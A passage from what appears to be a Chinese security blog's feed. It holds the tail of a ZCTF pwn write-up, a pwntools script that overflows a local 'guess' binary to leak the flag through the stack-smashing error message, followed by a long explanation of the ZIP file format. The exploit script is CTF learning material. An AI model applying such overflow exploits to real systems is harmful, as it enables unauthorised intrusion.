debug:</span><br><span class="line">            io = gdb.debug(<span class="string">'./guess'</span>,<span class="string">'''</span></span><br><span class="line"><span class="string">                                        bp 0x40096D</span></span><br><span class="line"><span class="string">                                        bp 0x400A2F</span></span><br><span class="line"><span class="string">                                        bp 0x400A61</span></span><br><span class="line"><span class="string">                                        bp 0x400A83'''</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io = process(<span class="string">'./guess'</span>)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'\\x'</span> + <span class="string">'%02X'</span> % ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> str])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(io,result)</span>:</span></span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">        flag += chr(ord(i)^ord(<span class="string">'b'</span>))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Flag: ZCTF&#123;%s"</span>%flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_len</span><span class="params">(io,length)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"please guess the flag:\n"</span>)</span><br><span class="line">    flag_addr = <span class="number">0x6010C0</span></span><br><span class="line">    payload = <span class="string">'A'</span>*length + <span class="string">"\x00"</span></span><br><span class="line">    io.writeline(payload)</span><br><span class="line"></span><br><span class="line">    result = io.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> result</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"len error"</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(io,length)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"please guess the flag:\n"</span>)</span><br><span class="line">    flag_addr = <span class="number">0x6010C0</span> + <span class="number">5</span></span><br><span class="line">    payload = <span class="string">"ZCTF&#123;"</span></span><br><span class="line">    payload = payload.ljust(length,<span class="string">'b'</span>)</span><br><span class="line">    payload += <span class="string">"\x00"</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x7fffffffddb8</span> - <span class="number">0x7fffffffdc90</span>,<span class="string">'A'</span>)</span><br><span class="line">    payload += p64(flag_addr)</span><br><span class="line">    io.writeline(payload)</span><br><span class="line">    </span><br><span class="line">    io.recvuntil(<span class="string">"*** stack smashing detected ***: "</span>)</span><br><span class="line">    result = io.recvline()</span><br><span class="line">    <span class="keyword">print</span> result</span><br><span class="line">    <span class="keyword">print</span> str_to_hex(result[<span class="number">0</span>:<span class="number">27</span>]) + result[<span class="number">27</span>:<span class="number">-1</span>] + str_to_hex(result[<span class="number">-1</span>:])</span><br><span class="line">    result = result.split(<span class="string">' terminated\n'</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">print</span> str_to_hex(result)</span><br><span class="line">    xor(io,result)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    debug = <span class="number">0</span> <span class="comment"># debug = 1表示进行调试</span></span><br><span class="line">    mark = <span class="number">0</span> <span class="comment"># mark = 1表示泄露flag长度</span></span><br><span class="line">    <span class="keyword">if</span> mark:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>,<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"*********************Start*********************"</span></span><br><span class="line">            io = get_io()</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"length:"</span>,i</span><br><span class="line">            <span class="keyword">if</span> leak_len(io,i) == <span class="keyword">True</span>:</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                io.close()</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"**********************End**********************"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        length = <span class="number">32</span></span><br><span class="line">        io = get_io()</span><br><span class="line">        pwn(io,length)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ZIP文件格式分析</title>
      <link href="/2020/05/08/ZIP%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/"/>
      <url>/2020/05/08/ZIP%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<blockquote><p>ZIP文件格式分析<br>刚分析完RAR文件格式，一想，干脆把ZIP文件格式也分析了吧<br>不过ZIP文件格式有官方文档，比较详细，这里也就是理解加翻译了一下。英文不好，菜哭。<br>后面有时间会加入实例分析环节。<br><a id="more"></a></p></blockquote><hr><h2 id="1、ZIP简介"><a href="#1、ZIP简介" class="headerlink" title="1、ZIP简介"></a>1、ZIP简介</h2><p>&emsp;&emsp;<code>ZIP文件格式</code>是一种<code>数据压缩</code>和<code>文档储存</code>的文件格式，原名<code>Deflate</code>，发明者为<code>菲尔·卡茨(Phil Katz)</code>，他于<code>1989年1月</code>公布了该格式的资料。该格式最初在PKWARE，Inc .的<code>PKZIP</code>实用程序中实现，替代了以前由Thom Henderson发明的<code>ARC压缩格式</code>。ZIP通常使用后缀名<code>“.zip”</code>，也使用<code>“.zipx ”</code>(较新的压缩算法)。ZIP被许多程序用作基本文件格式，通常使用不同的名称。它的<code>MIME格式</code>(Multipurpose Internet Mail Extensions)为<code>application/zip</code>。<br>&emsp;&emsp;目前，ZIP格式属于几种主流的压缩格式之一，其竞争者包括<code>RAR格式</code>以及开放源码的<code>7z格式</code>。从性能上比较，RAR及7z格式较ZIP格式<code>压缩率较高</code>，而7-Zip由于提供了免费的压缩工具而逐渐在更多的领域得到应用。Microsoft从<code>Windows ME</code>操作系统开始内置对zip格式的支持，即使用户的电脑上没有安装解压缩软件，也能打开和制作zip格式的压缩文件，<code>OS X</code>和流行的<code>Linux</code>操作系统也对zip格式提供了类似的支持。因此如果在网络上传播和分发文件，zip格式往往是最常用的选择。<br>&emsp;&emsp;ZIP是一种压缩文件格式，支持<code>无损数据压缩</code>。一个ZIP文件可能包含<code>一个或多个</code>已压缩的<code>文件</code>或<code>目录</code>。ZIP文件格式允许<code>多种压缩算法</code>。使用压缩时，必须使用已记录的压缩算法之一。<code>压缩方法8(Deflate)</code>是大多数ZIP兼容应用程序默认使用的方法。</p><h3 id="1-1、版本历史"><a href="#1-1、版本历史" class="headerlink" title="1.1、版本历史"></a>1.1、版本历史</h3><p>&emsp;&emsp;<code>.ZIP</code>文件格式规范具有其<code>自己的版本号</code>，该版本号不一定与<code>PKZIP工具的版本号</code>相对应，尤其是在<code>PKZIP 6</code>或<code>更高版本</code>中。在不同的时间，PKWARE添加了一些<code>初步功能</code>，这些功能允许PKZIP产品使用<code>高级功能</code>提取压缩文件，但是<code>创建</code>此类压缩文件的PKZIP产品要等到<code>下一个主要发行版本</code>才可用。其他<code>公司或组织</code>以自己的步调支持<code>PKWARE规范</code>。<br>&emsp;&emsp;<code>.ZIP</code>文件格式规范正式命名为“ <code>APPNOTE-.ZIP文件格式规范</code>”，并且自1990年代末开始在<code>PKWARE.com</code>网站上发布。该规范的多个版本尚未发布。某些功能的规范（例如<code>BZIP2压缩</code>，<code>强大的加密规范</code>(strong encryption specification)等）是在创建后几年由PKWARE发布的。在PKWARE网站上多次更改了在线规范的URL。</p><p><strong><code>各种版本的PKWARE规范的主要改进的摘要：</code></strong></p><ul><li><code>2.0</code> - (1993) 可以使用DEFLATE压缩文件条目，并使用传统的PKWARE加密(ZipCrypto)。</li><li><code>2.1</code> - (1996) Deflate64压缩。</li><li><code>4.5</code> - (2001) 已记录的64位zip格式。</li><li><code>4.6</code> - (2001) BZIP2压缩(直到APPNOTE 5.2发布时才在线发布)。</li><li><code>5.0</code> - (2002) SES：加密支持DES、Triple DES、RC2、RC4(直到APPNOTE 5.2发布时才在线发布)。</li><li><code>5.2</code> - (2003) SES(未在线发布的APPNOTE 5.1中定义)和WinZip(AE-x)的AES加密支持；SES加密支持的RC2-64的更正版本。</li><li><code>6.1</code> - (2004) 已记录的证书存储。</li><li><code>6.2.0</code> - (2004) 已记录的中心目录(Central Directory)加密。</li><li><code>6.3.0</code> - (2006) 已记录的Unicode(UTF-8)文件名存储。支持的哈希，压缩(LZMA，PPMd +)，加密算法的扩展列表。</li><li><code>6.3.1</code> - (2007) 已更正的SHA-256/384/512的标准哈希值。</li><li><code>6.3.2</code> - (2007) 已记录的压缩方法97(WavPack)。</li><li><code>6.3.3</code> - (2012) 文档格式更改，使用JTC 1/SC 34 N 1621指示的JTC 1参考解释性报告(RER)等方法，以方便从其他标准参考PKWARE应用说明。</li><li><code>6.3.4</code> - (2014) 更新PKWARE，Inc.官方地址。</li><li><code>6.3.5</code> - (2018) 已记录的压缩方法16、96和99，DOS时间戳时间和精度，为密钥和解密增加了额外字段，以及错别字和说明。</li><li><code>6.3.6</code> - (2019) 更正了印刷错误。</li></ul><p>&emsp;&emsp;<code>WinZip</code>从版本<code>12.1</code>开始，对于使用<code>压缩方法</code>比<code>DEFLATE</code>更新的ZIP文件使用扩展名<code>.zipx</code>。特别是方法<code>BZip</code>、<code>LZMA</code>、<code>PPMd</code>、<code>Jpeg</code>和<code>Wavpack</code>。当选择<code>“最佳方法”</code>压缩时，后两种将应用于适当的文件类型。</p><hr><h2 id="2、ZIP文件"><a href="#2、ZIP文件" class="headerlink" title="2、ZIP文件"></a>2、ZIP文件</h2><h3 id="2-1、什么是ZIP文件"><a href="#2-1、什么是ZIP文件" class="headerlink" title="2.1、什么是ZIP文件"></a>2.1、什么是ZIP文件</h3><p>&emsp;&emsp;ZIP文件可以由标准<code>.ZIP</code>文件扩展名标识，尽管不需要使用文件扩展名。使用<code>.ZIPX</code>扩展名也可以用于识别ZIP文件。其他使用<code>ZIP格式</code>的常见文件扩展名包括<code>.JAR</code>、<code>.WAR</code>、<code>.DOCX</code>、<code>.XLSX</code>、<code>.PPTX</code>、<code>.ODT</code>、<code>.ODS</code>、<code>.ODP</code>等。<code>读取</code>或<code>写入</code>ZIP文件的程序应依靠本文档中描述的<code>内部记录签名</code>来标识这种格式的文件。<br>&emsp;&emsp;ZIP文件应至少包含<code>一个文件</code>，并且可以包含<code>多个文件</code>。<br>&emsp;&emsp;<code>数据压缩</code>可以用来减少放置在ZIP文件中的文件的大小，但这<code>不是必需</code>的。此格式支持使用<code>多种数据压缩算法</code>。使用压缩时，必须使用<code>已记录</code>的压缩算法之一。建议实验者对他们的数据进行试验，以确定哪种可用算法可以提供最佳压缩以满足他们的需求。<code>压缩方法8(Deflate)</code>是大多数ZIP兼容应用程序<code>默认</code>使用的方法。<br>&emsp;&emsp;<code>数据加密</code>可以用来保护ZIP文件中的文件。在这种格式下，加密支持的<code>加密方法</code>包括<code>密码</code>和<code>公用/专用密钥</code>。可以<code>单独</code>使用或<code>结合</code>使用。加密可以应用于单个文件。可以通过加密ZIP文件的存储在<code>中心目录(Central Directory)中的元数据</code>来增加额外的安全性。<br>&emsp;&emsp;必须使用<code>CRC32</code>为每个文件提供<code>数据完整性</code>。<br>&emsp;&emsp;通过使用<code>数字签名</code>，可以包括<code>其他数据完整性</code>。 <code>单个文件</code>可以使用<code>一个</code>或<code>多个</code>数字签名进行签名。 <code>中心目录(Central Directory)</code>（如果签名）必须使用<code>单个</code>签名。<br>&emsp;&emsp;文件可以放在<code>未压缩</code>或<code>存储</code>的ZIP文件中。本文档中使用的术语“<code>存储</code>”是指文件被复制到未压缩的ZIP文件中。<br>&emsp;&emsp;放置在ZIP文件中的<code>每个数据文件</code>都可以进行<code>压缩</code>，<code>存储</code>，<code>加密</code>或与同一ZIP文件中其他数据文件的存档方式无关的<code>数字签名</code>。<br>&emsp;&emsp;ZIP文件可以<code>流式传输</code>，<code>分段</code>(在固定或可移动的媒体上)或“<code>自解压</code>”。 <code>自解压ZIP文件</code>必须在ZIP文件中包含<code>目标平台</code>的提取代码。<br>&emsp;&emsp;<code>ZIP的常见用法</code>或许还包括<code>清单文件的使用</code>。 <code>清单文件</code>将应用程序的特定信息存储在<code>已存储在ZIP文件中的文件</code>中。 这个<code>清单文件</code>应该是ZIP文件中的<code>第一个文件</code>。 该规范(官方文档)不提供任何有关在ZIP文件中使用清单文件的信息或指南。<br>&emsp;&emsp;ZIP文件可以放在<code>其他ZIP文件</code>中。</p><h3 id="2-2、ZIP元数据-ZIP-Metadata"><a href="#2-2、ZIP元数据-ZIP-Metadata" class="headerlink" title="2.2、ZIP元数据(ZIP Metadata)"></a>2.2、ZIP元数据(ZIP Metadata)</h3><p>&emsp;&emsp;ZIP文件由<code>元数据</code>标识，元数据由<code>定义的记录类型</code>组成，这些<code>记录类型</code>包含维护放置在ZIP文件中的文件所需的<code>存储信息</code>。 每个记录类型必须使用标识记录类型的<code>头标识</code>来标识。 <code>标识值</code>以两个字节的常量标记<code>0x4b50</code>开头，代表字符“<code>PK</code>”。</p><h3 id="2-3、-ZIP文件的常规格式"><a href="#2-3、-ZIP文件的常规格式" class="headerlink" title="2.3、.ZIP文件的常规格式"></a>2.3、.ZIP文件的常规格式</h3><p>&emsp;&emsp;一个ZIP文件必须包含“<code>中心目录结束记录</code>(End of Central Directory Record)”。 仅包含“<code>中心目录结束记录</code>(End of Central Directory Record)”的ZIP文件被视为<code>空ZIP文件</code>。 可以在ZIP文件中<code>添加</code>或<code>替换</code>文件，也可以<code>删除</code>文件。 一个ZIP文件必须只有<code>一个</code>“中心目录结束记录(End of Central Directory Record)”。 本规范中定义的<code>其他记录</code>可以根据需要用于支持<code>单个</code>ZIP文件的<code>存储要求</code>。<br>&emsp;&emsp;在ZIP文件中的<code>每个文件</code>的前面都必须有一个该文件的“<code>本地文件头</code>(Local File Header)”记录。 每个“<code>本地文件头</code>(Local File Header)”都必须在ZIP文件的<code>中心目录</code>(Central Directory)部分中随附一个相应的“<code>中心目录头</code>(Central Directory Header)”记录。<br>&emsp;&emsp;文件可以在ZIP文件中以<code>任意顺序</code>存储。 一个ZIP文件可以分割成<code>多个卷</code>，也可以分成<code>用户定义的段大小</code>。 除非本文档中为<code>特定数据元素</code>另外指定，否则所有值都必须以<code>小端字节顺序</code>存储。<br>&emsp;&emsp;<code>压缩</code>不得应用于“<code>本地文件头</code>(Local File Header)”，“<code>加密头</code>(encryption header)”或“<code>中心目录结束记录</code>(End of Central Directory Record)”。 <code>单个</code>“<code>中心目录记录</code>(Central Directory Records)”绝不能压缩，但是所有“<code>中心目录记录</code>(Central Directory Records)”的<code>总和</code>可以压缩。<br>&emsp;&emsp;<code>文件数据</code>后可以跟文件的“<code>数据描述符</code>(Data Descriptor)”。 数据描述符用于促进<code>ZIP文件流传输</code>。</p><h4 id="2-3-1、-ZIP文件整体布局"><a href="#2-3-1、-ZIP文件整体布局" class="headerlink" title="2.3.1、.ZIP文件整体布局"></a>2.3.1、.ZIP文件整体布局</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[<span class="built_in">local</span> file header 1] - 本地文件头1</span><br><span class="line">[encryption header 1] - 加密头1</span><br><span class="line">[file data 1] - 文件数据1</span><br><span class="line">[data descriptor 1] - 数据描述符1</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">[<span class="built_in">local</span> file header n] - 本地文件头n</span><br><span class="line">[encryption header n] - 加密头n</span><br><span class="line">[file data n] - 文件数据n</span><br><span class="line">[data descriptor n] - 数据描述符n</span><br><span class="line">[archive decryption header] - 压缩文档解密头</span><br><span class="line">[archive extra data record] - 压缩文档扩展数据记录</span><br><span class="line">[central directory header 1] - 中心目录头1</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">[central directory header n] - 中心目录头n</span><br><span class="line">[digital signature] - 数字签名</span><br><span class="line">[zip64 end of central directory record] - zip64中心目录结束记录</span><br><span class="line">[zip64 end of central directory locator] - zip64中心目录结束定位器</span><br><span class="line">[end of central directory record] - 中心目录结束记录</span><br></pre></td></tr></table></figure><h4 id="2-3-2、本地文件头-Local-File-Header"><a href="#2-3-2、本地文件头-Local-File-Header" class="headerlink" title="2.3.2、本地文件头(Local File Header)"></a>2.3.2、本地文件头(Local File Header)</h4><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Local file header signature</td><td style="text-align:center">4</td><td style="text-align:left">文件头标识，固定值(50 4B 03 04)</td></tr><tr><td style="text-align:left">Version needed to extract</td><td style="text-align:center">2</td><td style="text-align:left">解压文件所需的ZIP最低版本</td></tr><tr><td style="text-align:left">General purpose bit flag</td><td style="text-align:center">2</td><td style="text-align:left">通用位标志</td></tr><tr><td style="text-align:left">Compression method</td><td style="text-align:center">2</td><td style="text-align:left">压缩方式</td></tr><tr><td style="text-align:left">Last mod file time</td><td style="text-align:center">2</td><td style="text-align:left">文件最后修改时间</td></tr><tr><td style="text-align:left">Last mod file date</td><td style="text-align:center">2</td><td style="text-align:left">文件最后修改日期</td></tr><tr><td style="text-align:left">CRC-32</td><td style="text-align:center">4</td><td style="text-align:left">未压缩数据的CRC32</td></tr><tr><td style="text-align:left">Compressed size</td><td style="text-align:center">4</td><td style="text-align:left">压缩后的大小</td></tr><tr><td style="text-align:left">Uncompressed size</td><td style="text-align:center">4</td><td style="text-align:left">未压缩的大小</td></tr><tr><td style="text-align:left">File name length</td><td style="text-align:center">2</td><td style="text-align:left">文件名长度</td></tr><tr><td style="text-align:left">Extra field length</td><td style="text-align:center">2</td><td style="text-align:left">扩展区域长度</td></tr><tr><td style="text-align:left">File name</td><td style="text-align:center">N</td><td style="text-align:left">文件名</td></tr><tr><td style="text-align:left">Extra field</td><td style="text-align:center">N</td><td style="text-align:left">扩展区域</td></tr></tbody></table><p>&emsp;&emsp;扩展区域包含各种可选数据，例如特定于OS的属性。它分为多个块，每个块具有16位ID码和16位长度。紧随其后的是压缩数据。</p><h4 id="2-3-3、文件数据-File-data"><a href="#2-3-3、文件数据-File-data" class="headerlink" title="2.3.3、文件数据(File data)"></a>2.3.3、文件数据(File data)</h4><p>&emsp;&emsp;应将文件的<code>压缩</code>或<code>存储</code>数据紧随在<code>本地文件头</code>(Local File Header)后。如果文件<code>已加密</code>，则文件的<code>加密头</code>(encryption header)应放置在<code>本地文件头</code>(Local File Header)之后和<code>文件数据</code>之前。 对于.ZIP压缩文档中的<code>每个文件</code>，重复执行一系列的<code>[本地文件头][加密头][文件数据][数据描述符]</code>结构。<br>&emsp;&emsp;0字节<code>文件</code>，<code>目录</code>和其他<code>不包含任何内容的文件类型</code>，不得包含<code>文件数据</code>。</p><h4 id="2-3-4、数据描述符-Data-descriptor"><a href="#2-3-4、数据描述符-Data-descriptor" class="headerlink" title="2.3.4、数据描述符(Data descriptor)"></a>2.3.4、数据描述符(Data descriptor)</h4><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Optional data descriptor signature</td><td style="text-align:center">4</td><td style="text-align:left">(可选的)数据描述符标识，固定值(50 4B 07 08)</td></tr><tr><td style="text-align:left">CRC-32</td><td style="text-align:center">4</td><td style="text-align:left">未压缩数据的CRC32</td></tr><tr><td style="text-align:left">Compressed size</td><td style="text-align:center">4</td><td style="text-align:left">压缩后的大小</td></tr><tr><td style="text-align:left">Uncompressed size</td><td style="text-align:center">4</td><td style="text-align:left">未压缩的大小</td></tr></tbody></table><p>&emsp;&emsp;如果设置了<code>通用位标志</code>的<code>位3</code>，则该描述符必须存在(见下文)。 它按<code>字节对齐</code>，紧随压缩数据的最后一个字节。仅在<code>无法在输出的.ZIP文件中查找</code>时(例如，当输出.ZIP文件是<code>标准输出</code>或<code>不可搜索的设备</code>时)，才应使用此描述符。对于<code>ZIP64(tm)</code>格式的压缩文件，<code>压缩</code>和<code>未压缩</code>的大小均为8个字节。<br>&emsp;&emsp;<code>压缩文件</code>时，当文件大小超过<code>0xFFFFFFFF</code>时，<code>压缩</code>和<code>未压缩</code>的大小应以<code>ZIP64格式</code>(作为<code>8字节</code>的值)存储。 但是，<code>无论文件大小如何</code>，都可以使用<code>ZIP64格式</code>。 <code>解压缩</code>时，如果该文件存在<code>ZIP64扩展信息扩展区域</code>，则<code>压缩</code>和<code>未压缩</code>的大小将为<code>8字节</code>的值。<br>&emsp;&emsp;尽管<code>最初</code>未指定标识，但通常将值<code>0x08074B50</code>用作数据描述符记录的<code>标识值</code>。 实现者应注意，在读取ZIP文件以<code>确保兼容性</code>时，无论是否带有此标识标记的数据描述符，都可能会遇到ZIP文件，无论哪种情况都应说明。<br>&emsp;&emsp;<code>写ZIP文件</code>时，实现者应包括标记数据描述符记录的标识值。 <code>使用标识</code>时，当前为数据描述符记录定义的字段将紧随标识之后。<br>&emsp;&emsp;<code>可扩展的数据描述符</code>将在此APPNOTE的将来版本中发布。 此新记录旨在解决先前使用此记录的<code>冲突</code>，并为<code>流文件处理</code>提供更好的支持。<br>&emsp;&emsp;当使用<code>中心目录加密</code>方法时，数据描述符记录<code>不是必需的</code>，但可以使用。 如果<code>存在</code>，并且<code>通用位标记</code>的<code>位3</code>被设置为指示其存在，则<code>数据描述符记录</code>的字段中的值必须设置为<code>二进制0</code>。</p><h4 id="2-3-5、压缩文档解密头-Archive-decryption-header"><a href="#2-3-5、压缩文档解密头-Archive-decryption-header" class="headerlink" title="2.3.5、压缩文档解密头(Archive decryption header)"></a>2.3.5、压缩文档解密头(Archive decryption header)</h4><p>&emsp;&emsp;ZIP格式规范的<code>6.2版</code>中引入了<code>压缩文档解密头</code>。 该记录的存在是对作为本文档中所述的<code>强加密规范</code>的一部分实现的<code>中心目录加密功能</code>的支持。当中心目录结构<code>已加密</code>时，此<code>解密头</code>必须位于<code>加密数据段</code>之前。<br>&emsp;&emsp;<code>加密的数据段</code>应包含<code>压缩文档扩展数据记录</code>(如果存在)和<code>加密的中心目录结构数据</code>。 <code>该数据记录</code>的格式与<code>压缩文件数据</code>之前的<code>加密头记录</code>相同。 如果中心目录结构<code>已加密</code>，则使用“<code>ZIP64中心目录结束记录</code>(ZIP64 end of central directory record)”中的“<code>中心目录的开始</code>(Start of Central Directory)”字段确定此数据记录的<code>开始位置</code>。 有关<code>压缩文档解密头记录</code>中使用的字段的信息，请参阅“强加密规范”部分。</p><h4 id="2-3-6、压缩文档扩展数据记录-Archive-extra-data-record"><a href="#2-3-6、压缩文档扩展数据记录-Archive-extra-data-record" class="headerlink" title="2.3.6、压缩文档扩展数据记录(Archive extra data record)"></a>2.3.6、压缩文档扩展数据记录(Archive extra data record)</h4><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Archive extra data signature</td><td style="text-align:center">4</td><td style="text-align:left">压缩文档扩展数据标识，固定值(50 4B 06 08)</td></tr><tr><td style="text-align:left">Extra field length</td><td style="text-align:center">4</td><td style="text-align:left">扩展区域长度</td></tr><tr><td style="text-align:left">Extra field data</td><td style="text-align:center">N</td><td style="text-align:left">扩展区域</td></tr></tbody></table><p>&emsp;&emsp;ZIP格式规范的<code>6.2版</code>中引入了<code>Archive Extra Data Record</code>。 该记录可以用于支持作为本文档中所述的<code>强加密规范</code>的一部分实现的<code>中心目录加密功能</code>。当该记录存在时，该记录必须紧随<code>中心目录数据结构</code>之前。<br>&emsp;&emsp;该数据记录的大小应包含在<code>中心目录结束记录</code>(End of central directory record)的<code>中心目录大小</code>(Size of the Central Directory)字段中。 如果中心目录结构<code>已压缩</code>，但<code>未加密</code>，则使用“<code>ZIP64中心目录结束记录</code>(ZIP64 end of central directory record)”中的“<code>中心目录的开始</code>(Start of Central Directory)”字段确定此数据记录的<code>起始位置</code>。</p><h4 id="2-3-7、中心目录结构-Central-directory-structure"><a href="#2-3-7、中心目录结构-Central-directory-structure" class="headerlink" title="2.3.7、中心目录结构(Central directory structure)"></a>2.3.7、中心目录结构(Central directory structure)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[central directory header 1] - 中心目录头1</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">[central directory header n] - 中心目录头n</span><br><span class="line">[digital signature] - 数字签名</span><br></pre></td></tr></table></figure><p><strong><code>中心目录头(Central directory header):</code></strong></p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Central directory file header signature</td><td style="text-align:center">4</td><td style="text-align:left">中心目录文件头标识，固定值(50 4B 01 02)</td></tr><tr><td style="text-align:left">Version made by</td><td style="text-align:center">2</td><td style="text-align:left">压缩所用的ZIP版本</td></tr><tr><td style="text-align:left">Version needed to extract</td><td style="text-align:center">2</td><td style="text-align:left">解压文件所需的ZIP最低版本</td></tr><tr><td style="text-align:left">General purpose bit flag</td><td style="text-align:center">2</td><td style="text-align:left">通用位标记</td></tr><tr><td style="text-align:left">Compression method</td><td style="text-align:center">2</td><td style="text-align:left">压缩方法</td></tr><tr><td style="text-align:left">Last mod file time</td><td style="text-align:center">2</td><td style="text-align:left">文件最后修改时间</td></tr><tr><td style="text-align:left">Last mod file date</td><td style="text-align:center">2</td><td style="text-align:left">文件最后修改日期</td></tr><tr><td style="text-align:left">CRC-32</td><td style="text-align:center">4</td><td style="text-align:left">未压缩数据的CRC32</td></tr><tr><td style="text-align:left">Compressed size</td><td style="text-align:center">4</td><td style="text-align:left">压缩后的大小</td></tr><tr><td style="text-align:left">Uncompressed size</td><td style="text-align:center">4</td><td style="text-align:left">未压缩的大小</td></tr><tr><td style="text-align:left">File name length</td><td style="text-align:center">2</td><td style="text-align:left">文件名长度</td></tr><tr><td style="text-align:left">Extra field length</td><td style="text-align:center">2</td><td style="text-align:left">扩展区域长度</td></tr><tr><td style="text-align:left">File comment length</td><td style="text-align:center">2</td><td style="text-align:left">文件注释长度</td></tr><tr><td style="text-align:left">Disk number start</td><td style="text-align:center">2</td><td style="text-align:left">文件开始位置所在的磁盘编号</td></tr><tr><td style="text-align:left">Internal file attributes</td><td style="text-align:center">2</td><td style="text-align:left">内部文件属性</td></tr><tr><td style="text-align:left">External file attributes</td><td style="text-align:center">4</td><td style="text-align:left">外部文件属性</td></tr><tr><td style="text-align:left">Relative offset of local header</td><td style="text-align:center">4</td><td style="text-align:left">本地文件头的相对偏移</td></tr><tr><td style="text-align:left">File name</td><td style="text-align:center">N</td><td style="text-align:left">文件名</td></tr><tr><td style="text-align:left">Extra field</td><td style="text-align:center">N</td><td style="text-align:left">扩展区域</td></tr><tr><td style="text-align:left">File comment</td><td style="text-align:center">N</td><td style="text-align:left">文件注释</td></tr></tbody></table><p><strong><code>数字签名(Digital signature):</code></strong></p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Header signature</td><td style="text-align:center">4</td><td style="text-align:left">头标识，固定值(50 4B 05 05)</td></tr><tr><td style="text-align:left">Size of data</td><td style="text-align:center">2</td><td style="text-align:left">数据的大小</td></tr><tr><td style="text-align:left">Signature data</td><td style="text-align:center">N</td><td style="text-align:left">签名数据</td></tr></tbody></table><p>&emsp;&emsp;随着本规范6.2版中<code>中心目录加密功能</code>的引入，<code>中心目录结构</code>(Central directory structure)可以以<code>压缩并加密</code>的方式存储。 尽管不是必需的，但在<code>加密中心目录结构</code>时假定它会被<code>压缩</code>以<code>提高存储效率</code>。有关<code>中心目录加密功能</code>的信息可以在描述<code>强加密规范</code>(Strong Encryption Specification)的部分中找到。<code>数字签名记录</code>(Digital signature)将不会被压缩或加密。</p><h4 id="2-3-8、ZIP64中心目录结束记录-ZIP64-end-of-central-directory-record"><a href="#2-3-8、ZIP64中心目录结束记录-ZIP64-end-of-central-directory-record" class="headerlink" title="2.3.8、ZIP64中心目录结束记录(ZIP64 end of central directory record)"></a>2.3.8、ZIP64中心目录结束记录(ZIP64 end of central directory record)</h4><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">ZIP64 end of central directory record signature</td><td style="text-align:center">4</td><td style="text-align:left">ZIP64中心目录结束记录标识，固定值(50 4B 06 06)</td></tr><tr><td style="text-align:left">Size of ZIP64 end of central directory record</td><td style="text-align:center">8</td><td style="text-align:left">ZIP64中心目录结束记录的大小</td></tr><tr><td style="text-align:left">Version made by</td><td 